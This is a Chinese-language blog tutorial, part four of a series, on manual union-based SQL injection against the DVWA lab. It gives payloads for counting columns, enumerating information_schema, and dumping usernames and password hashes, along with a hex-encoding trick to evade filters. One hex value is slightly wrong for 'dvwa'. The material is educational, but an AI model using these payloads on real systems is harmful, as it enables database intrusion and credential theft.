---
layout: post
title: "SQL注入（四）"
category: SQL注入
tags: SQL注入 渗透测试
excerpt: 手注查询字段数、数据库、用户、版本信息以及具体数据
---
> 如果觉得这篇文章写的不错，来给我[打赏鼓励](https://github.com/miaochiahao/miaochiahao.github.io/blob/master/pictures/alipay.jpg?raw=true)一下吧~我会写出更好的文章


一天不更就觉得是对生命的浪费啊魂淡(,,･∀･)ﾉ゛

## 使用order by查询字段

`order by` 语句会对查询结果进行排列，可以借此判断列数。`+--+`可以对后面内容进行注释，便利构造语句


## 联合查询获取当前数据库、用户、版本信息

可以构造`union select`语句，来查询正在使用中的用户`user()`、数据库`database()`、数据库版本`version()`、服务器操作系统等信息`@@version_compile_os`，例如：

{% highlight sql %}
union select user(),database()+--+
{% endhighlight %}

## 查询数据库用户名和密码

前面提到过，在MySQL 5.0及以上版本，`information_schema`存储着所有数据库下的表名和列名信息。

### 查询表名

`information_schema.tables`为数据库名下表名`tables`记录所有数据库名下所有表名信息的表。

{% highlight sql %}
union select 1, group_concat(table_name) from information_schema.tables where table_schema=0x64767741+--+&Submit=Submit
{% endhighlight %}

这条语句表示联合查询满足数据库名为`information_schema`的库中的`tables`这个表，将其所有符合条件的字段，即属于`dvwa`库的表的信息都列出来

其中`0x64767741`为十六进制数，表示数据库名`dvwa`，在我们实际操作时，应当在查询到数据库名之后将其转换为十六进制数填入这个位置，可以借此绕过过滤检测。

### 查询列名

同理`information_schema.columns`是记录数据库下所有列名信息的表

若已知表名`users`，想要查询其下面的列名，则需要用以下语句：

{% highlight sql %}
union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273+--+&Submit=Submit
{% endhighlight %}

其中`0x7573657273`为`users`的十六进制形式

### 查询用户名密码

{% highlight sql %}
union select user,password from users+--+&Submit=Submit
{% endhighlight %}

其中users为上一步查到的表名